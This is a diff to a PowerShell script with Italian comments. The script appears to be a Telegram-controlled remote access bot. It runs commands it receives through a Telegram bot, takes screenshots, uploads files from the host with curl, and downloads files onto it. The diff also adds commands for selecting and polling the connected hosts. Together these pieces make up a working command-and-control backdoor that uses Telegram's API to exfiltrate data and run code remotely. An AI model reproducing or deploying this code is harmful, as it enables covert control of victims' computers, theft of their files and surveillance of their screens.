@@ -8,12 +8,12 @@ Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
 
 $session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
-$telegram_id, $api_token  = "@1", "@2"
-$api_get_updates    = 'https://api.telegram.org/bot{0}/getUpdates' -f $api_token
-$api_send_messages  = 'https://api.telegram.org/bot{0}/SendMessage' -f $api_token
-$api_get_file       = 'https://api.telegram.org/bot{0}/getFile?file_id=' -f $api_token
-$api_download_file  = 'https://api.telegram.org/file/bot{0}/' -f $api_token
-$api_upload_file    = 'https://api.telegram.org/bot{0}/sendDocument?chat_id={1}' -f $api_token, $telegram_id
+$telegram_id, $api_token = "@1", "@2"
+$api_get_updates    = 'https://api.telegram.org/bot{0}/getUpdates'                  -f $api_token
+$api_send_messages  = 'https://api.telegram.org/bot{0}/SendMessage'                 -f $api_token
+$api_get_file       = 'https://api.telegram.org/bot{0}/getFile?file_id='            -f $api_token
+$api_download_file  = 'https://api.telegram.org/file/bot{0}/'                       -f $api_token
+$api_upload_file    = 'https://api.telegram.org/bot{0}/sendDocument?chat_id={1}'    -f $api_token, $telegram_id
 $logs = $true
 $Global:ProgressPreference = 'SilentlyContinue'
 
@@ -21,13 +21,12 @@ $Global:ProgressPreference = 'SilentlyContinue'
 function Log($string)
 {
     if ($logs) {
-        Write-Host -ForegroundColor Yellow -BackgroundColor Black ("+ [" + (get-date).ToString() + "] " + $string)
-        Start-Sleep -Milliseconds 50
+        Write-Host -ForegroundColor Yellow -BackgroundColor Black ("[i] [" + (get-date).ToString() + "] " + $string)
     }
 }
 
 
-function CheckAdminRights()
+function CheckAdminRights
 {
     Log "Controllo se lo script è in esecuzione come amministratore"
     $elevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent())
@@ -40,7 +39,7 @@ function CheckAdminRights()
 }
 
 
-function GetScreenshot 
+function GetScreenshot
 {
     try {
         SendMessage "Procedo a catturare la schermata..."
@@ -68,7 +67,7 @@ function DownloadFile($file_id, $file_name)
     $file_path      = $get_file_path.result.file_path
 
     Log "Scarico il file [$($file_name)] nella macchina"
-    Invoke-RestMethod -Method Get -Uri ($api_download_file + $file_path) -OutFile $file_name -WebSession $session
+    Invoke-RestMethod -Method Get -Uri ($api_download_file + $file_path) -OutFile $file_name -WebSession $session | Out-Null
 
     Log "Verifico che il file sia stato scaricato"
     if (Test-Path -Path $file_name) {
@@ -81,10 +80,9 @@ function DownloadFile($file_id, $file_name)
 
 function SendFile($filePath) 
 {
-    SendMessage "Procedo ad inviare il file [$($filePath)]"
     if (Test-Path -Path $filePath -PathType Leaf) {
         try {
-            Log "Invio del file in corso"
+            Log "Procedo ad inviare il file [$($filePath)]"
             curl.exe -F document=@"$filePath" $api_upload_file --insecure | Out-Null
             Log "File inviato con successo"
         } catch {
@@ -106,14 +104,13 @@ function SendMessage($output)
     $MessageToSend = @{
         chat_id    = $telegram_id
         parse_mode = "MarkdownV2"
-        text       = "``````#$hostia`n$output`n``````"
+        text       = "``````OutputCode`n<$hostia>`n$output`n``````"
     }
 
     $MessageToSend = $MessageToSend | ConvertTo-Json
 
     try {
         Invoke-RestMethod -Method Post -Uri $api_send_messages -Body $MessageToSend -ContentType "application/json; charset=utf-8" -WebSession $session | Out-Null
-        Log "Messaggio inviato con successo"
     } catch {
         Log "Il messaggio non è stato inviato: [$($Error[0])]"
         Start-Sleep -Seconds 3
@@ -140,7 +137,6 @@ function CheckRequiredParameters($CommandString)
         # Ottengo i parametri obbligatori per il comando
         $requiredParameters = Get-Help -Name $commandName -Parameter * -ErrorAction SilentlyContinue | Where-Object { $_.Required -eq $true -and $_.Position -eq 0 } | Select-Object -ExpandProperty Name
         if ($requiredParameters.Count -eq 0) {
-            Log "Il comando $commandName non ha parametri obbligatori."
             return $true
         }
 
@@ -157,7 +153,6 @@ function CheckRequiredParameters($CommandString)
             SendMessage "Il comando '$commandName' richiede i seguenti parametri obbligatori mancanti: $($missingParameters -join ', ')"
             return $false
         } else {
-            Log "Il comando $commandName ha tutti i parametri obbligatori necessari."
             return $true
         }
     } else {
@@ -193,16 +188,20 @@ function CommandListener
                     $offset     = $message.result.Count
                     $message    = $message.result.Message[-1]
                     $user_id    = $message.chat.id
+                    $uname      = $message.chat.username
                     $text       = $message.text
                     $document   = $message.document
                     
+                    # Gestione comandi personalizzati
                     if ($text.Length -gt 0) {
                         $check_command = $text.Split()
                         if ($check_command[0] -match "SET") {
+                            # Se il comando è SET ALL imposta tutti gli host connessi a ricevere ed eseguire i comandi
                             if ($check_command[1] -match "ALL") {
                                 $hostname = $hostia
                                 SendMessage "Computer pronto a ricevere istruzioni"
                             } else {
+                                # Se il comando è SET <hostname> imposta solo lui a rispondere ai comandi
                                 $hostname = $check_command[1]
                                 if ($env:COMPUTERNAME -match $hostname) {
                                     SendMessage "Computer pronto a ricevere istruzioni"
@@ -211,9 +210,18 @@ function CommandListener
                             continue
                         }
                         
+                        # Se il comando è ONLINE richiedi agli host se sono operativi e pronti
                         if ($check_command[0] -match "ONLINE") {
                             SendMessage "Computer operativo"
                             continue
+                        }
+
+                        # Se il comando è WHOIS richiedi agli host chi sta ricevendo i comandi
+                        if ($check_command[0] -match "WHOIS") {
+                            if ($hostname -match $hostia) {
+                                SendMessage "Io sono operativo!"
+                                continue
+                            }
                         }
                     }
         
@@ -241,7 +249,7 @@ function CommandListener
 
                                 if ($output_splitted.Count -eq 0) {
                                     Start-Sleep -Milliseconds 300
-                                    SendMessage "Comando ricevuto/eseguito"
+                                    SendMessage "Comando eseguito"
                                 }
                             }
 
@@ -251,7 +259,7 @@ function CommandListener
                                 DownloadFile $file_id $file_name
                             }
                         } else {
-                            $unauth_user_found = ("Unauthorized user found! " + $user_id)
+                            $unauth_user_found = ("L'utente [" + $user_id + "] " + $uname + " ha provato ad utilizzare il bot eseguendo questa azione: [" + $text + "]")
                             SendMessage $unauth_user_found
                         }
                     }
@@ -273,5 +281,5 @@ function CommandListener
     $session.Dispose()
 }
 
-
+Log "Avvio il bot..."
 CommandListener
